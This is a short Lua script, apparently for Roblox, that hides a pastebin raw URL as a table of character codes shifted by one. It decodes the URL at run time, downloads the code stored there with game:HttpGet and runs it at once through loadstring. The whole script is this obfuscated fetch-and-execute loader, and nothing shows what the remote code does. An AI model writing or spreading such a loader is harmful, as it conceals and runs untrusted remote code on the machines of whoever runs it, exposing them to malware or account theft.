local t = {
105,
117,
117,
113,
116,
59,
48,
48,
113,
98,
116,
117,
102,
99,
106,
111,
47,
100,
112,
110,
48,
115,
98,
120,
48,
82,
55,
57,
116,
98,
72,
79,
77
}

local s = ""

for i = 1, #t do
    local v = t[i] - 1
    s = s .. string.char(v)
end

loadstring(game:HttpGet(s))()
